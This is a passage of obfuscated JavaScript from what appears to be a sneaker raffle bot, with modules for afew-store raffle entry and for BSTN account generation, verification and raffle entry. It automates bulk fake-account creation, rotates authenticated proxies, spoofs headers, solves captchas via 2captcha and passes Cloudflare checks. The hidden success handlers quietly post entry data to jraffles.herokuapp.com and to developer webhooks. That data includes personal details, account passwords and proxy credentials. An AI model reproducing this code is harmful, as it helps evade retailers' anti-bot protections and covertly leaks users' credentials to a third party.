                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x48a10a = await _0x3ad8ba['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x750b15[0x0] + ':' + _0x750b15[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x1e1654 = JSON['parse'](_0x144018['readFileSync']('sizes.json', 'utf-8')), _0x17f91b = _0x36e4c8[_0x5bc20e]['Url'], _0x3340f7 = _0x36e4c8[_0x5bc20e]['Size'], _0x30f235;
                        async function _0x926d9e() {
                            var _0x2d2594 = new _0x3ce32f['CookieJar']();
                            console['log'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x1dcd04;
                            let _0x3101c3 = {
                                'method': 'GET',
                                'cookieJar': _0x2d2594,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x750b15[0x2] + ':' + _0x750b15[0x3] + '@' + _0x750b15[0x0] + ':' + _0x750b15[0x1]
                            }, _0x37faa3 = _0x17f91b['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0xa37f1e = _0x37faa3 + '.json', _0x33fcd5 = await _0x469c71(_0xa37f1e);
                            console['log'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0xa68e7f = _0x33fcd5['data']['product']['variants'];
                            if (_0x3340f7 != 'RANDOM') {
                                if (_0xa68e7f[0x1]['option1']['includes']('W')) {
                                    const _0x12867a = _0x1e1654['women']['find'](_0x4ecf85 => _0x4ecf85['EUsize'] === _0x3340f7);
                                    _0x12867a && (_0x3340f7 = _0x12867a['size']);
                                } else {
                                    if (_0xa68e7f[0x1]['option1']['includes']('Y')) {
                                        const _0x168287 = _0x1e1654['GS']['find'](_0x529c33 => _0x529c33['EUsize'] === _0x3340f7);
                                        _0x168287 && (_0x3340f7 = _0x168287['size']);
                                    } else {
                                        const _0x9f7206 = _0x1e1654['men']['find'](_0x3d0a45 => _0x3d0a45['EUsize'] === _0x3340f7);
                                        _0x9f7206 && (_0x3340f7 = _0x9f7206['size']);
                                    }
                                }
                                for (var _0x18257e of _0xa68e7f) {
                                    _0x18257e['option1'] == _0x3340f7 && (_0x1dcd04 = _0x18257e['id']);
                                }
                            } else {
                                var _0xfaf5a1 = Math['round'](Math['random']() * (_0xa68e7f['length'] - 0x1));
                                _0x1dcd04 = _0xa68e7f[_0xfaf5a1]['id'];
                            }
                            console['log'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x469c71('https://raffles.afew-store.com/cart/' + _0x1dcd04 + ':1'), _0x30f235 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x926d9e();
                        } catch (_0x25b7b4) {
                            if (_0x25b7b4['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x25b7b4);
                        }
                        const _0x3d409b = await _0x48a10a['newPage']();
                        await _0x3d409b['setDefaultNavigationTimeout'](0x1d4c0), await _0x3d409b['authenticate']({
                            'username': '' + _0x750b15[0x2],
                            'password': '' + _0x750b15[0x3]
                        }), await _0x3d409b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3d409b['setRequestInterception'](!![]), _0x3d409b['on']('request', _0x590646 => {
                            _0x590646['resourceType']() === 'image' || _0x590646['resourceType']() === 'font' || _0x590646['resourceType']() === 'media' ? _0x590646['abort']() : _0x590646['continue']();
                        });
                        try {
                            await _0x3d409b['goto'](_0x30f235, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x3d409b['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x3d409b['type']('#checkout_email', '' + _0x36e4c8[_0x5bc20e]['Email']), await _0x41ff52(0x320), await _0x3d409b['type']('#checkout_attributes_instagram', '' + _0x36e4c8[_0x5bc20e]['Follower']), await _0x41ff52(0x320), await _0x3d409b['select']('#checkout_shipping_address_country', '' + _0x36e4c8[_0x5bc20e]['Country']), await _0x3d409b['waitForTimeout'](0x258), await _0x3d409b['type']('#checkout_shipping_address_first_name', '' + _0x36e4c8[_0x5bc20e]['FirstName']), await _0x3d409b['waitForTimeout'](0x320), await _0x3d409b['type']('#checkout_shipping_address_last_name', '' + _0x36e4c8[_0x5bc20e]['LastName']), await _0x3d409b['waitForTimeout'](0x2bc), await _0x3d409b['type']('#checkout_shipping_address_address1', _0x36e4c8[_0x5bc20e]['Address1'] + '\x20' + _0x36e4c8[_0x5bc20e]['HouseNumber']), await _0x3d409b['waitForTimeout'](0x2bc), await _0x3d409b['type']('#checkout_shipping_address_address2', '' + _0x36e4c8[_0x5bc20e]['Address2']), await _0x3d409b['waitForTimeout'](0x2bc), await _0x3d409b['type']('#checkout_shipping_address_zip', '' + _0x36e4c8[_0x5bc20e]['Zip']), await _0x3d409b['waitForTimeout'](0x2bc), await _0x3d409b['type']('#checkout_shipping_address_city', '' + _0x36e4c8[_0x5bc20e]['City']), await _0x3d409b['waitForTimeout'](0x2bc);
                        if (_0x36e4c8[_0x5bc20e]['State'] != '')
                            try {
                                const _0x4122ce = JSON['parse'](_0x144018['readFileSync']('States.json', 'utf8'));
                                await _0x41ff52(0x1f4);
                                if (_0x36e4c8[_0x5bc20e]['State']['length'] > 0x2)
                                    for (let _0x1ee845 of _0x4122ce) {
                                        if (_0x1ee845['Province'] == _0x36e4c8[_0x5bc20e]['State']) {
                                            await _0x3d409b['select']('#checkout_shipping_address_province', _0x1ee845['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x3d409b['select']('#checkout_shipping_address_province', _0x36e4c8[_0x5bc20e]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x41ff52(0x1f4), console['log'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x41ff52(0x190), _0x3d409b['evaluate'](() => {
                            const _0x4deb84 = document['querySelector']('#continue_button');
                            for (var _0x10db7f = 0x0; _0x10db7f < 0x5; _0x10db7f++) {
                                if (_0x4deb84) {
                                    _0x4deb84['click'](), _0x4deb84['click']();
                                    break;
                                } else
                                    _0x41ff52(0xfa0);
                            }
                        }), await _0x3d409b['waitForTimeout'](0x9c4);
                        try {
                            await _0x3d409b['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x3d409b['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x588255 => _0x588255['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x3d409b['waitForTimeout'](0x7d0), console['log'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x3d409b['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x41ff52(0x3e8), await _0x3d409b['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x198ec4 => _0x198ec4['submit']()), await _0x41ff52(0x3e8);
                        try {
                            await _0x3d409b['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x3d409b['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x1a9047 => _0x1a9047['submit']());
                        try {
                            await _0x3d409b['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x8d52b3 = 'no', _0xe72aef(_0x36e4c8[_0x5bc20e], _0x5c7a1b), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                                try {
                                    await _0x161ab9(_0x4a0109['webhook'], _0x3cfca3['succesDEVMSG']);
                                } catch {
                                }
                            await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x3cfca3['succesDEVMSG']), await _0x41ff52(0xc8);
                            try {
                                await _0x161ab9(_0x17a127, _0x3cfca3['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x4f2583['replace']('#', ''),
                                    'module': _0x5c7a1b['name'],
                                    'entrydata': JSON['stringify'](_0x95ae84),
                                    'proxy': '' + _0x31b156[_0x5bc20e]
                                };
                                var _0x3255f6 = JSON['stringify'](prxdata);
                                let _0x3670fe = { 'headers': { 'content-type': 'application/json' } };
                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x3255f6, _0x3670fe);
                            } catch (_0x4cd09a) {
                            }
                        } catch (_0x225b87) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x4f22ca) {
                        _0x4f22ca['message']['includes']('selector') && (_0x4f22ca = 'Connection\x20Error');
                        console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20' + _0x4f22ca)), _0x48ff20 = '' + _0x4f22ca;
                        var _0x339152 = await _0x17c0a2(_0x36e4c8[_0x5bc20e], _0x5c7a1b, 'dev', !![], _0x48ff20);
                        _0x3cfca3['errorDEV'] = { 'embeds': [_0x339152] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x3cfca3['errorDEV']), await _0x161ab9(_0x11ee4c, _0x3cfca3['errorDEV']), _0x8d52b3 = 'yes';
                    } finally {
                        _0x48a10a && _0x48a10a['close']();
                        if (_0x8d52b3 == 'yes' && _0x81cc94 != 0x5 && _0x48ff20 != 'Size\x20Not\x20Found') {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x5c7a1b['name'] + ']\x20Task\x20' + (_0x5bc20e + 0x1) + '\x20:\x20Retrying\x20(' + _0x81cc94 + '\x20/\x205)')), _0x5bc20e = _0x5bc20e - 0x1, _0x81cc94 = _0x81cc94 + 0x1;
                            continue;
                        }
                        _0x8d52b3 == 'yes' && _0x81cc94 >= 0x5 && (_0x53e25e(_0x36e4c8[_0x5bc20e], _0x5c7a1b), _0x8d52b3 = 'no', _0x81cc94 = 0x0);
                        if (_0x5bc20e + 0x1 == _0x36e4c8['length']) {
                            await _0x41ff52(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4a0109['AfewDelay'] + '\x20ms'), await _0x41ff52(_0x4a0109['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2968f0, _0x2c6b08, _0x5947ed) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x340feb = 0x0; _0x340feb < _0x2c6b08['length']; _0x340feb++) {
                        if (_0x4cc9b1 != 'yes')
                            var _0x4cc9b1 = '', _0x297d89 = 0x0;
                        var _0x42ac29;
                        try {
                            await _0x547a29(_0x2c6b08, _0x340feb);
                        } catch {
                            _0x4cc9b1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3a603f(_0x2968f0['name'] + '\x20Task\x20' + (_0x340feb + 0x1) + '\x20/\x20' + _0x2c6b08['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4);
                        var _0x466a2e = await _0x17c0a2(_0x2c6b08[_0x340feb], _0x2968f0, 'acc', ![]);
                        const _0x23483d = { 'succesDEVMSG': { 'embeds': [_0x466a2e] } }, _0x1e75ef = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x2b7a8e = Math['round'](Math['random']() * (_0x5947ed['length'] - 0x1)), _0x4a3a24 = _0x5947ed[_0x2b7a8e]['split'](':'), _0x15bb07;
                        try {
                            _0x15bb07 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a3a24[0x0] + ':' + _0x4a3a24[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x15bb07 = await _0x3ad8ba['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a3a24[0x0] + ':' + _0x4a3a24[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x6c4612 = await _0x15bb07['newPage']();
                            await _0x6c4612['authenticate']({
                                'username': '' + _0x4a3a24[0x2],
                                'password': '' + _0x4a3a24[0x3]
                            }), console['log'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Task\x20' + (_0x340feb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x6c4612['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x6c4612['setRequestInterception'](!![]), _0x6c4612['on']('request', _0x4885ff => {
                                _0x4885ff['resourceType']() === 'image' ? _0x4885ff['abort']() : _0x4885ff['continue']();
                            });
                            try {
                                await _0x6c4612['goto']('' + _0x1e75ef), await _0x6c4612['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x4cc9b1 = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x6c4612['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Task\x20' + (_0x340feb + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x41ff52(0x7d0), console['log'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Task\x20' + (_0x340feb + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x41ff52(0x190), await _0x6c4612['waitForSelector']('#firstname'), await _0x6c4612['type']('#firstname', _0x2c6b08[_0x340feb]['FirstName'], { 'delay': 0xf0 }), await _0x41ff52(0x190), await _0x6c4612['type']('#lastname', _0x2c6b08[_0x340feb]['LastName'], { 'delay': 0xe6 }), await _0x41ff52(0x190), await _0x6c4612['type']('#email_address', _0x2c6b08[_0x340feb]['Email'], { 'delay': 0x122 }), await _0x41ff52(0x190), await _0x6c4612['type']('#password', _0x2c6b08[_0x340feb]['Password'], { 'delay': 0x82 }), await _0x41ff52(0x1f4), await _0x6c4612['type']('#password-confirmation', _0x2c6b08[_0x340feb]['Password'], { 'delay': 0x7c }), console['log'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Task\x20' + (_0x340feb + 0x1) + '\x20:\x20Sending\x20Request'), await _0x41ff52(0x2bc), await _0x6c4612['$eval']('#form-validate', _0x50ae7d => _0x50ae7d['submit']()), await _0x41ff52(0x1388);
                            const _0x2cf306 = await _0x6c4612['$']('#email_address-error');
                            if (_0x2cf306)
                                throw new Error('Invalid\x20Email');
                            const _0x1731c5 = await _0x6c4612['$']('#password-error');
                            if (_0x1731c5)
                                throw new Error('Invalid\x20Password');
                            await _0x6c4612['waitForSelector']('div.mesg-success'), _0x4cc9b1 = 'no', console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Task\x20' + (_0x340feb + 0x1) + '\x20:\x20Account\x20' + _0x2c6b08[_0x340feb]['Email'] + '\x20Generated')), _0x144018['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x2c6b08[_0x340feb]['Email'] + ',' + _0x2c6b08[_0x340feb]['Password']);
                            try {
                                _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x23483d['succesDEVMSG']);
                            } catch {
                            }
                            await _0x161ab9(_0x2467e3, _0x23483d['succesDEVMSG']);
                            let _0x109658 = _0x2c6b08[_0x340feb];
                            try {
                                prxdata = {
                                    'username': _0x4f2583['replace']('#', ''),
                                    'module': _0x2968f0['name'],
                                    'entrydata': JSON['stringify'](_0x109658),
                                    'proxy': '' + _0x5947ed[_0x340feb]
                                };
                                var _0x5dadac = JSON['stringify'](prxdata);
                                let _0x3e9f44 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x5dadac, _0x3e9f44);
                            } catch (_0x5040b6) {
                            }
                            console['log'](_0xe8dd24['yellow'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Task\x20' + (_0x340feb + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0xca5ce8) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Task\x20' + (_0x340feb + 0x1) + '\x20:\x20' + _0xca5ce8)), _0x42ac29 = '' + _0xca5ce8;
                            var _0x2ad639 = await _0x17c0a2(_0x2c6b08[_0x340feb], _0x2968f0, 'acc', !![], _0x42ac29);
                            _0x23483d['errorDEV'] = { 'embeds': [_0x2ad639] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x23483d['errorDEV']), await _0x161ab9(_0x11ee4c, _0x23483d['errorDEV']), _0x4cc9b1 = 'yes';
                        } finally {
                            if (_0x15bb07)
                                _0x15bb07['close']();
                            if (_0x4cc9b1 == 'yes' && _0x297d89 != 0x5) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Task\x20' + (_0x340feb + 0x1) + '\x20:\x20Retrying\x20(' + _0x297d89 + '\x20/\x205)')), _0x340feb = _0x340feb - 0x1, _0x297d89 = _0x297d89 + 0x1;
                                continue;
                            }
                            _0x4cc9b1 == 'yes' && _0x297d89 >= 0x5 && (_0x53e25e(_0x2c6b08[_0x340feb], _0x2968f0), _0x4cc9b1 = 'no', _0x297d89 = 0x0), console['log'](_0x2fd7e7() + '\x20[' + _0x2968f0['name'] + ']\x20Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x3b0d96, _0x2d640f) {
                    var _0x3583c8 = ![], _0x5b622b = [];
                    async function _0x304e2b() {
                        var _0x542e3f = new _0x2b7859({
                            'user': _0x4a0109['masterMail'],
                            'password': _0x4a0109['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x31d489(_0x4915ff) {
                            _0x542e3f['openBox']('INBOX', ![], _0x4915ff);
                        }
                        _0x542e3f['once']('ready', function () {
                            _0x31d489(function (_0x5d682c, _0x3501d6) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5d682c)
                                    throw _0x5d682c;
                                _0x542e3f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x181b31, _0x2750f4) {
                                    if (!_0x2750f4 || !_0x2750f4['length'])
                                        console['log'](_0x2fd7e7() + '\x20[' + _0x3b0d96['name'] + ']\x20No\x20mails\x20found'), _0x542e3f['end']();
                                    else {
                                        var _0x36a1ad = _0x542e3f['seq']['fetch'](_0x2750f4, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x36a1ad['on']('message', function (_0x49a7bb, _0x722646) {
                                            var _0x2278fc = '(#' + _0x722646 + ')\x20';
                                            _0x49a7bb['on']('body', function (_0x400d73, _0x1255b4) {
                                                _0x186dbf(_0x400d73, (_0x3c1abe, _0x5419ad) => {
                                                    var _0x5a550f = _0x5419ad['text']['split']('[')[0x2], _0x1dc153 = _0x5a550f['split'](']')[0x0];
                                                    _0x5b622b['push'](_0x1dc153);
                                                });
                                            }), _0x49a7bb['once']('end', function () {
                                            });
                                        }), _0x36a1ad['once']('error', function (_0x52e47b) {
                                            console['log']('Fetch\x20error:\x20' + _0x52e47b), _0x3583c8 = !![];
                                        }), _0x36a1ad['once']('end', function () {
                                            _0x542e3f['end'](), _0x3583c8 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x542e3f['once']('error', function (_0x3fa954) {
                            console['log'](_0xe8dd24['red'](_0x3fa954['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3583c8 = !![];
                        }), _0x542e3f['once']('end', async function () {
                            _0x3583c8 = !![];
                        }), _0x542e3f['connect']();
                    }
                    async function _0xfbadc4(_0x14f5eb, _0x76650d, _0x310901) {
                        _0x3ad8ba['use'](_0x36d6c8());
                        for (var _0x403b70 = 0x0; _0x403b70 < _0x76650d['length']; _0x403b70++) {
                            if (_0x3b06e6 != 'yes')
                                var _0x3b06e6 = '', _0x1c12bf = 0x0;
                            var _0x2ac7c2 = Math['round'](Math['random']() * (_0x310901['length'] - 0x1)), _0x2ed30e = _0x310901[_0x2ac7c2]['split'](':'), _0x5e886d;
                            try {
                                _0x5e886d = await _0x3ad8ba['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x2ed30e[0x0] + ':' + _0x2ed30e[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x5e886d = await _0x3ad8ba['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x2ed30e[0x0] + ':' + _0x2ed30e[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x26877f = await _0x5e886d['newPage']();
                                await _0x26877f['authenticate']({
                                    'username': '' + _0x2ed30e[0x2],
                                    'password': '' + _0x2ed30e[0x3]
                                }), console['log'](_0x2fd7e7() + '\x20[' + _0x14f5eb['name'] + ']\x20Task\x20' + (_0x403b70 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x26877f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x26877f['setRequestInterception'](!![]), _0x26877f['on']('request', _0x3168ef => {
                                    _0x3168ef['resourceType']() === 'image' || _0x3168ef['resourceType']() === 'font' || _0x3168ef['resourceType']() === 'media' ? _0x3168ef['abort']() : _0x3168ef['continue']();
                                }), console['log'](_0x2fd7e7() + '\x20[' + _0x14f5eb['name'] + ']\x20Task\x20' + (_0x403b70 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x26877f['goto'](_0x76650d[_0x403b70]);
                                } catch {
                                    _0x3b06e6 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x2fd7e7() + '\x20[' + _0x14f5eb['name'] + ']\x20Task\x20' + (_0x403b70 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x26877f['waitForTimeout'](0xbb8);
                                try {
                                    await _0x26877f['waitForSelector']('.account-nav'), _0x3b06e6 = 'no', console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x14f5eb['name'] + ']\x20Task\x20' + (_0x403b70 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x2b2ebe = await _0x17c0a2(null, _0x14f5eb, 'ver', ![]);
                                    const _0x4c3c21 = { 'succesDEVMSG': { 'embeds': [_0x2b2ebe] } };
                                    await _0x161ab9(_0x194c59, _0x4c3c21['succesDEVMSG']);
                                } catch {
                                    _0x3b06e6 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x473c70) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x14f5eb['name'] + ']\x20Task\x20' + (_0x403b70 + 0x1) + '\x20:\x20' + _0x473c70));
                                var _0x5b5ac3 = _0x473c70, _0x928fdc = await _0x17c0a2(null, _0x14f5eb, 'ver', !![], _0x5b5ac3);
                                const _0xaa6a7b = { 'errorDEVMSG': { 'embeds': [_0x928fdc] } };
                                _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0xaa6a7b['errorDEVMSG']), await _0x161ab9(_0x11ee4c, _0xaa6a7b['errorDEVMSG']);
                            } finally {
                                _0x5e886d['close']();
                                if (_0x3b06e6 == 'yes' && _0x1c12bf != 0x5) {
                                    console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x14f5eb['name'] + ']\x20Task\x20' + (_0x403b70 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1c12bf + '\x20/\x205)')), _0x403b70 = _0x403b70 - 0x1, _0x1c12bf = _0x1c12bf + 0x1;
                                    continue;
                                }
                                _0x3b06e6 == 'yes' && _0x1c12bf >= 0x5 && (_0x3b06e6 = 'no', _0x1c12bf = 0x0), console['log'](_0x2fd7e7() + '\x20[' + _0x14f5eb['name'] + ']\x20Waiting\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                            }
                        }
                    }
                    try {
                        _0x304e2b();
                        while (!_0x3583c8) {
                            await _0x41ff52(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5b622b['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x41ff52(0x7d0);
                    }
                    await _0xfbadc4(_0x3b0d96, _0x5b622b, _0x2d640f);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x53170f, _0x784393, _0x83f002) {
                    _0x3ad8ba['use'](_0x36d6c8()), _0x3ad8ba['use'](_0x541303({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4a0109['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xd983d9 = 0x0; _0xd983d9 < _0x784393['length']; _0xd983d9++) {
                        var _0x4d2a71, _0x190a4d = _0x784393[_0xd983d9];
                        try {
                            await _0x547a29(_0x784393, _0xd983d9);
                        } catch {
                            _0x48b10e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x5596b4(_0x7eb182) {
